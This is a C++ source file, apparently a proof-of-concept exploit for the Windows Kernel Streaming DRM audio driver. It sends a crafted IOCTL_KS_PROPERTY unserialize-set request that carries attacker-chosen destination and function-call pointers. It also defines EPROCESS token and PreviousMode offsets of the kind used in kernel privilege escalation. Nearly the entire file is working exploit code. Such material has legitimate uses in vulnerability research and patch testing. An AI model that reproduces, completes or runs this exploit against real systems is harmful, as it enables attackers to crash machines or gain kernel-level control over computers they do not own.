#define UNICODE 1
#define _UNICODE 1

#include <windows.h>
#include <winioctl.h>
#include <initguid.h>
#include <ks.h>
#include <ksmedia.h>
#include <ksproxy.h>
#include <setupapi.h>
#include <stdio.h>
#include <stdint.h>

#pragma comment(lib, "ksproxy.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ksuser.lib")

#define EPROCESS_TOKEN_OFFSET           0x4B8
#define KTHREAD_PREVIOUS_MODE_OFFSET    0x232
#define TOKEN_SIZE                      0x8

#pragma pack(1)
typedef struct _EXPLOIT_DATA1 {
    PVOID Destination;
} EXPLOIT_DATA1;

#pragma pack(1)
typedef struct _EXPLOIT_DATA2 {
    char Pad[0x20];
    PVOID ptr_ArbitraryFunCall;
} EXPLOIT_DATA2;

extern "C" {
    __declspec(dllimport)
        HRESULT WINAPI KsOpenDefaultDevice(
            const GUID* Category,
            ACCESS_MASK Access,
            PHANDLE DeviceHandle
        );
}


HANDLE GetKsDevice(const GUID categories) {
    HANDLE hDevice = 0;
    HRESULT hr = KsOpenDefaultDevice(&categories, GENERIC_READ | GENERIC_WRITE, &hDevice);
    if (hr != NOERROR) return NULL;
    return hDevice;
}

UCHAR InBuffer[sizeof(KSPROPERTY) + sizeof(EXPLOIT_DATA2)] = { 0 };
UCHAR OutBuffer[sizeof(KSPROPERTY_SERIALHDR) + sizeof(KSPROPERTY_SERIAL) + sizeof(EXPLOIT_DATA1)] = { 0 };


int main() {
    HANDLE hDevice = NULL;

    HRESULT hr = KsOpenDefaultDevice(&KSCATEGORY_DRM_DESCRAMBLE, GENERIC_READ | GENERIC_WRITE, &hDevice);
    if (FAILED(hr) || hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open KS device\n");
        return 1;
    }
    KSPROPERTY* pInBufProperty = (KSPROPERTY*)InBuffer;
    EXPLOIT_DATA2* pInBufData = (EXPLOIT_DATA2*)(pInBufProperty + 1);

    KSPROPERTY_SERIALHDR* pSerialHdr = (KSPROPERTY_SERIALHDR*)OutBuffer;
    KSPROPERTY_SERIAL* pSerial = (KSPROPERTY_SERIAL*)(pSerialHdr + 1);
    EXPLOIT_DATA1* pOutBufData = (EXPLOIT_DATA1*)(pSerial + 1);

    pOutBufData->Destination = (PVOID)0xDEADBEEFDEADBEEF;
    pInBufData->ptr_ArbitraryFunCall = (PVOID)0x4242424242424242;

    pInBufProperty->Set = KSPROPSETID_DrmAudioStream;
    pInBufProperty->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;
    pInBufProperty->Id = 0;

    pSerialHdr->PropertySet = KSPROPSETID_DrmAudioStream;
    pSerialHdr->Count = 1;

    pSerial->PropertyLength = sizeof(EXPLOIT_DATA1);
    pSerial->Id = 0;
    pSerial->PropTypeSet.Set = KSPROPSETID_DrmAudioStream;
    pSerial->PropTypeSet.Flags = 0;
    pSerial->PropTypeSet.Id = 0x45;


    printf("[+] Sending IOCTL to trigger crash...\n");

    BOOL res = DeviceIoControl(
            hDevice,
            IOCTL_KS_PROPERTY,
            pInBufProperty,
            sizeof(InBuffer),
            pSerialHdr,
            sizeof(OutBuffer),
            NULL, NULL
        );

    if (!res) {
        DWORD err = GetLastError();
        printf("[-] SendIoctlReq failed. Error = %lu\n", err);
    }
    else {
        printf("[+] PoC IOCTL sent successfully (exploit path triggered)\n");
    }

    if (hDevice) CloseHandle(hDevice);
    return 0;

}